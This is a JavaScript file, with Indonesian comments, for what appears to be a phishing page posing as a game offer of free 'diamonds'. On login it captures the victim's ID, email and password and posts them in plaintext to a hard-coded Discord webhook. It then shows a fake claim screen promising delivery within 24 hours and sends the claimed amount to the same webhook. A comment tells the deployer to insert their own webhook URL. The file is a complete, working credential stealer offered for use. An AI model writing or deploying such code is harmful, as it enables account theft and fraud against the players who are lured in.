document.getElementById('loginForm').addEventListener('submit', function(e) {
            e.preventDefault();

            const id = document.getElementById('id').value;
            const email = document.getElementById('email').value;
            const password = document.getElementById('password').value;

            // Cek apakah ID atau email sudah terdaftar
            if (localStorage.getItem(id)) {
                alert('ID sudah terdaftar!');
            } else {
                // Simpan ID dan email di localStorage
                localStorage.setItem(id, JSON.stringify({ email }));

                // Kirim data ke Discord
                const webhookURL = "https://discord.com/api/webhooks/1335133557945008250/rYYd3fJ6B-2YJzqLqC2AzgO1W_Llz0uUeR0WyC_6vNYvXHVyk1F0cn2gkSTcZV7WFSlj"; // Ganti dengan URL Webhook Discord kamu
                const payload = {
                    content: `New login attempt
                    _____________________
                    ID: ${id}<br>
                    Email: ${email}<br>
                    Password: ${password}
                    _______________________`
                };

                fetch(webhookURL, {
                    method: 'POST',
                    headers: {
                        'Content-Type': 'application/json'
                    },
                    body: JSON.stringify(payload)
                }).then(response => response.json())
                  .then(data => {
                      console.log("Data berhasil dikirim ke Discord");
                  }).catch(error => {
                      console.error("Error mengirim data ke Discord", error);
                  });

                // Pindah ke halaman claim diamond
                document.getElementById('login-container').style.display = 'none';
                document.getElementById('claim-container').style.display = 'block';
            }
        });

        document.getElementById('claimButton').addEventListener('click', function() {
            const diamondAmount = document.getElementById('diamond-amount').value;
            const message = document.getElementById('message');
            message.style.display = 'block';
            message.textContent = `Tunggu 1x24 jam untuk klaim ${diamondAmount} Diamond Anda.`;

            // Kirim klaim diamond ke Discord
            const webhookURL = "https://discord.com/api/webhooks/1335133557945008250/rYYd3fJ6B-2YJzqLqC2AzgO1W_Llz0uUeR0WyC_6vNYvXHVyk1F0cn2gkSTcZV7WFSlj"; // Ganti dengan URL Webhook Discord kamu
            const payload = {
                content: `Claim Diamond berhasil:\nJumlah Diamond: ${diamondAmount}`
            };

            fetch(webhookURL, {
                method: 'POST',
                headers: {
                    'Content-Type': 'application/json'
                },
                body: JSON.stringify(payload)
            }).then(response => response.json())
              .then(data => {
                  console.log("Diamond berhasil dikirim");
              }).catch(error => {
                  console.error("Error mengirim Diamond", error);
              });
        });